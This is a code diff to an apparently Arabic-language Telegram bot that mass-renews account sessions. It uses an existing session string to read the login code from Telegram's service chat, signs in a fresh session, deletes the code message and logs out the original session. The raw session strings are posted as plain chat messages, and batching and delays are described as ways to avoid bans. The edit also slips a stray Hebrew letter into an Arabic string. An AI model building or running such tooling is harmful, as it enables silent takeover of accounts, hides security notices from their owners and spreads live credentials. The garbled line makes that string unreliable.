@@ -2098,7 +2098,6 @@ async def monitor_and_leave(admin_id, target_username, golden_groups):
 
 
 
-
 # =========================================================
 # ♻️ مـيـزة تـجـديـد الـجـلـسـات (Session Renewal) الـذكـيـة المحصنة
 # =========================================================
@@ -2111,124 +2110,133 @@ def renew_manage_menu(call):
         "🛂┊ **إدارة تـجـديـد الـجـلـسـات (Session Renewal):**\n\n"
         "⎉╎ الـمـيـزة تـقـوم بـإنـشـاء جـلـسـات جـديـدة كـلـيـاً لـلأمـان.\n"
         "⎉╎ تـسـحـب الـكـود، تـسـجـل الـدخـول، وتـنـتـحـر مـن الـقـديـمـة.\n"
-        "•❐• اخـتـر الـحـسـابـات لـبـدء الـتـجـديـد:",
+        "•❐• اخـتـر الـحـسـابـات לـبـدء الـتـجـديـد:",
         call.message.chat.id, call.message.message_id,
         reply_markup=accounts_action_keyboard(call.from_user.id, "renew"),
         parse_mode="Markdown"
     )
 
 async def renew_single_session(acc_id, phone, name, pyro_session):
-    """المحرك الفعلي لتجديد الجلسة يعمل بالتوازي والمحصن ضد الثغرات والضغط"""
+    """المحرك الفعلي لتجديد الجلسة"""
     
-    # تأخير عشوائي (من 0.1 إلى 2.5 ثانية) لمنع ضرب سيرفرات تليجرام
-    await asyncio.sleep(random.uniform(0.1, 2.5))
+    # تأخير بسيط جداً لمنع تزامن الطلبات في نفس الجزء من الثانية
+    await asyncio.sleep(random.uniform(0.1, 1.5))
     
-    async with account_semaphore:
-        # no_updates=True تمنع التحديثات لحل مشكلة فصل الشبكة
-        client_a = Client(f"old_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True, no_updates=True)
-        client_b = Client(f"new_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=f"Secured_V4_{acc_id}", no_updates=True)
+    # Client A (القديم): يجب أن يستلم التحديثات ليقرأ الكود فوراً
+    client_a = Client(f"old_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
+    # Client B (الجديد): مجرد تسجيل دخول، لا نحتاج تحديثات (يخفف الضغط)
+    client_b = Client(f"new_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=f"Secured_V5_{acc_id}", no_updates=True)
 
-        try:
-            await asyncio.wait_for(client_a.connect(), timeout=15)
-            await asyncio.wait_for(client_b.connect(), timeout=15)
+    try:
+        # إعطاء مهلة كافية للاتصال براحة
+        await asyncio.wait_for(client_a.connect(), timeout=20)
+        await asyncio.wait_for(client_b.connect(), timeout=20)
 
-            request_time = time.time()
-            sent_code = await client_b.send_code(phone)
+        # توقيت الطلب (مع خصم 15 ثانية لاختلاف توقيت سيرفرات تليجرام)
+        request_time = time.time() - 15
+        
+        sent_code = await client_b.send_code(phone)
 
-            valid_codes = [] 
-            
-            for _ in range(6): 
-                await asyncio.sleep(3)
-                try:
-                    async for msg in client_a.get_chat_history(777000, limit=5):
-                        if msg.date and msg.date.timestamp() >= (request_time - 15):
-                            if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
-                                match = re.search(r'\b(\d{5})\b', msg.text)
-                                if match:
-                                    code = match.group(1)
-                                    if (code, msg.id) not in valid_codes:
-                                        valid_codes.append((code, msg.id))
-                except:
-                    pass
-                
-                if valid_codes:
-                    break
-
-            if not valid_codes:
-                return False, f"❌ `{phone}`: لـم يـصـل أي كـود جـديـد خـلال الـوقـت.", None
-
-            valid_codes.sort(key=lambda x: x[1], reverse=True)
-
-            logged_in = False
-            msg_to_delete = None
-            
-            for code, msg_id in valid_codes:
-                try:
-                    await client_b.sign_in(phone, sent_code.phone_code_hash, code)
-                    logged_in = True
-                    msg_to_delete = msg_id
-                    break 
-                except Exception as e:
-                    err_str = str(e).upper()
-                    if "PHONE_CODE_INVALID" in err_str or "CODE_INVALID" in err_str:
-                        continue 
-                    elif "SESSION_PASSWORD_NEEDED" in err_str:
-                        return False, f"⚠️ `{phone}`: يـوجـد تـحـقـق بـخـطـوتـيـن! الـتـجـديـد يـتـطـلـب إزالـتـه.", None
-                    else:
-                        raise e 
-
-            if not logged_in:
-                return False, f"❌ `{phone}`: جـمـيـع الأكـواد الـمـسـتـلـمـة كـانـت خـاطـئـة.", None
-
-            me = await client_b.get_me()
-            if not me:
-                return False, f"❌ `{phone}`: فـشـل الـتـحـقـق مـن سـلامـة الـجـلـسـة الـجـديـدة.", None
-                
-            new_session_str = await client_b.export_session_string()
-
-            if msg_to_delete:
-                try: await client_a.delete_messages(777000, msg_to_delete)
-                except: pass
-
+        valid_codes = [] 
+        
+        for _ in range(6): # البحث لمدة 18 ثانية
+            await asyncio.sleep(3)
             try:
-                conn = get_db_conn()
-                c = conn.cursor()
-                c.execute("UPDATE sessions SET pyro_session=?, session_type='String' WHERE id=?", (new_session_str, acc_id))
-                conn.commit()
-                conn.close()
+                async for msg in client_a.get_chat_history(777000, limit=4):
+                    if msg.date and msg.date.timestamp() >= request_time:
+                        if msg.text and ("Login code" in msg.text or "كود الدخول" in msg.text or "تسجيل الدخول" in msg.text):
+                            match = re.search(r'\b(\d{5})\b', msg.text)
+                            if match:
+                                code = match.group(1)
+                                if (code, msg.id) not in valid_codes:
+                                    valid_codes.append((code, msg.id))
             except:
-                return False, f"❌ `{phone}`: خـطـأ فـي قـاعـدة الـبـيـانـات.", None
+                pass
+            
+            if valid_codes:
+                break
 
+        if not valid_codes:
+            return False, f"❌ `{phone}`: لـم يـصـل أي كـود جـديـد خـلال الـوقـت.", None
+
+        # ترتيب الأكواد من الأحدث للأقدم
+        valid_codes.sort(key=lambda x: x[1], reverse=True)
+
+        logged_in = False
+        msg_to_delete = None
+        
+        for code, msg_id in valid_codes:
             try:
-                await client_a.invoke(functions.auth.LogOut())
+                await client_b.sign_in(phone, sent_code.phone_code_hash, code)
+                logged_in = True
+                msg_to_delete = msg_id
+                break 
+            except Exception as e:
+                err_str = str(e).upper()
+                if "PHONE_CODE_INVALID" in err_str or "CODE_INVALID" in err_str:
+                    continue 
+                elif "SESSION_PASSWORD_NEEDED" in err_str:
+                    return False, f"⚠️ `{phone}`: يـوجـد تـحـقـق بـخـطـوتـيـن! الـتـجـديـد يـتـطـلـب إزالـتـه.", None
+                else:
+                    raise e 
+
+        if not logged_in:
+            return False, f"❌ `{phone}`: جـمـيـع الأكـواد الـمـسـتـلـمـة كـانـت خـاطـئـة.", None
+
+        me = await client_b.get_me()
+        if not me:
+            return False, f"❌ `{phone}`: فـشـل الـتـحـقـق مـن سـلامـة الـجـلـسـة الـجـديـدة.", None
+            
+        new_session_str = await client_b.export_session_string()
+
+        # مسح رسالة الكود من الجلسة القديمة
+        if msg_to_delete:
+            try: await client_a.delete_messages(777000, msg_to_delete)
             except: pass
 
-            # إرجاع: (حالة النجاح, لا يوجد نص فخم هنا, كود السشن الخام)
-            return True, "", new_session_str
+        # الحفظ في قاعدة البيانات
+        try:
+            conn = get_db_conn()
+            c = conn.cursor()
+            c.execute("UPDATE sessions SET pyro_session=?, session_type='String' WHERE id=?", (new_session_str, acc_id))
+            conn.commit()
+            conn.close()
+        except:
+            return False, f"❌ `{phone}`: خـطـأ فـي قـاعـدة الـبـيـانـات.", None
 
-        except Exception as e:
-            err_str = str(e) if str(e).strip() else type(e).__name__
-            err_str_lower = err_str.lower()
-            
-            if "flood" in err_str_lower or "fresh" in err_str_lower:
-                return False, f"⚠️ `{phone}`: الحساب محظور مؤقتاً من طلب الأكواد (FloodWait).", None
-            elif "timeout" in err_str_lower:
-                return False, f"⚠️ `{phone}`: انـقـطـع الاتـصـال مـع تـلـيـجـرام (Timeout).", None
-            elif "connection" in err_str_lower or "socket" in err_str_lower:
-                return False, f"⚠️ `{phone}`: انقطاع مفاجئ بالشبكة، لم يتأثر الحساب.", None
-            
-            return False, f"❌ `{phone}`: {err_str[:40]}", None
-            
-        finally:
-            if client_a.is_connected: 
-                try: await client_a.disconnect()
-                except: pass
-            if client_b.is_connected: 
-                try: await client_b.disconnect()
-                except: pass
+        # تسجيل الخروج من الجلسة القديمة
+        try:
+            await client_a.invoke(functions.auth.LogOut())
+        except: pass
+
+        # نجاح! نرسل السشن فقط في الـ return
+        return True, "", new_session_str
+
+    except Exception as e:
+        err_str = str(e) if str(e).strip() else type(e).__name__
+        err_str_lower = err_str.lower()
+        
+        if "flood" in err_str_lower or "fresh" in err_str_lower:
+            return False, f"⚠️ `{phone}`: مـحـظـور مـؤقـتـاً مـن طـلـب الأكـواد.", None
+        elif "timeout" in err_str_lower:
+            return False, f"⚠️ `{phone}`: انـقـطـع الاتـصـال مـع تـلـيـجـرام (Timeout).", None
+        elif "auth_key_duplicated" in err_str_lower:
+            return False, f"❌ `{phone}`: الـجـلـسـة مـضـروبـة أو مـسـتـخـدمـة بـمـكـان آخـر.", None
+        elif "connection" in err_str_lower or "socket" in err_str_lower:
+            return False, f"⚠️ `{phone}`: انـقـطـاع مـفـاجـئ بـالـشـبـكـة.", None
+        
+        return False, f"❌ `{phone}`: {err_str[:35]}", None
+        
+    finally:
+        if client_a.is_connected: 
+            try: await client_a.disconnect()
+            except: pass
+        if client_b.is_connected: 
+            try: await client_b.disconnect()
+            except: pass
 
 async def execute_renew_all_async(owner_id, chat_id, msg_id, target="all"):
-    """دالة تجميع المهام وقذفها للشاشة"""
+    """نظام الطابور الذكي (Batches) - يعالج 20 حساب دفعة واحدة لمنع الحظر"""
     accounts = get_all_accounts(owner_id)
     if target != "all":
         accounts = [acc for acc in accounts if str(acc[0]) == target]
@@ -2237,29 +2245,50 @@ async def execute_renew_all_async(owner_id, chat_id, msg_id, target="all"):
         bot.edit_message_text("❌ لا تـوجـد حـسـابـات لـلـعـمـل عـلـيـهـا.", chat_id, msg_id)
         return
 
-    # رسالة الانتظار بستايل زدثون
-    bot.edit_message_text(f"⏳ **جـاري تـجـديـد وتـأمـيـن {len(accounts)} حـسـاب بـ 50 اتـصـال مـتـوازي...**", chat_id, msg_id, parse_mode="Markdown")
-
-    tasks = [renew_single_session(acc[0], acc[1], acc[2], acc[4]) for acc in accounts]
-    results = await asyncio.gather(*tasks)
+    total_accs = len(accounts)
+    batch_size = 20 # معالجة 20 حساب بنفس الوقت كحد أقصى
+    
+    # تقسيم الحسابات إلى دفعات (كل دفعة 20 حساب)
+    account_batches = [accounts[i:i + batch_size] for i in range(0, total_accs, batch_size)]
 
     failed_msgs = []
     success_count = 0
+    processed_count = 0
 
-    # قذف الجلسات الجديدة (السشن الخام في رسالة لوحده)
-    for success, error_text, raw_session in results:
-        if success:
-            success_count += 1
-            try:
-                # إرسال كود الجلسة (Session) الخام فقط ليسهل تحويله
-                bot.send_message(chat_id, raw_session)
-                await asyncio.sleep(0.3)
-            except: pass
-        else:
-            # تخزين الأخطاء لعرضها في التقرير الختامي
-            failed_msgs.append(error_text)
+    for index, batch in enumerate(account_batches):
+        # تحديث رسالة التقدم الحية
+        progress_text = (
+            f"⏳ **جـاري تـجـديـد الـحـسـابـات بـنـظـام الـدُفـعـات...**\n\n"
+            f"⎉╎ الـمـعـالـجـة: `{processed_count}` مـن أصـل `{total_accs}`\n"
+            f"⎉╎ الـدُفـعـة الـحـالـيـة: `رقم {index + 1}` (تـضـم {len(batch)} حـسـاب)\n"
+            f"•❐• يـرجـى الانـتـظـار، هـذا الـنـظـام يـمـنـع الـحـظـر وانـقـطـاع الاتـصـال."
+        )
+        try:
+            bot.edit_message_text(progress_text, chat_id, msg_id, parse_mode="Markdown")
+        except: pass
 
-    # تقرير ختامي للمهمة بستايل زدثون وعبارتك المطلوبة
+        # تشغيل الـ 20 حساب في هذه الدفعة بالتوازي
+        tasks = [renew_single_session(acc[0], acc[1], acc[2], acc[4]) for acc in batch]
+        results = await asyncio.gather(*tasks)
+
+        # فرز النتائج
+        for success, error_text, raw_session in results:
+            processed_count += 1
+            if success:
+                success_count += 1
+                try:
+                    # قذف السشن الخام مباشرة
+                    bot.send_message(chat_id, raw_session)
+                    await asyncio.sleep(0.3)
+                except: pass
+            else:
+                failed_msgs.append(error_text)
+                
+        # استراحة بسيطة بين الدفعات لإراحة سيرفر تليجرام
+        if index < len(account_batches) - 1:
+            await asyncio.sleep(2)
+
+    # تقرير ختامي بستايل زدثون
     summary = (
         f"🛂┊ **تـم تـجـهـيـز الـجـلـسـات وتـأمـيـنـهـا !**\n\n"
         f"⎉╎ الـنـجـاح: `{success_count}`\n"
@@ -2269,10 +2298,11 @@ async def execute_renew_all_async(owner_id, chat_id, msg_id, target="all"):
     if failed_msgs:
         summary += "•❐• **تـفـاصـيـل الأخـطـاء:**\n" + "\n".join(failed_msgs)
 
+    # قص النص إذا تجاوز الحد المسموح
     if len(summary) > 4000:
         summary = summary[:3900] + "\n... (تـم قـص بـاقـي الأخـطـاء)"
 
-    bot.send_message(chat_id, summary, reply_markup=home_keyboard(owner_id), parse_mode="Markdown") 
+    bot.send_message(chat_id, summary, reply_markup=home_keyboard(owner_id), parse_mode="Markdown")
 
 
 
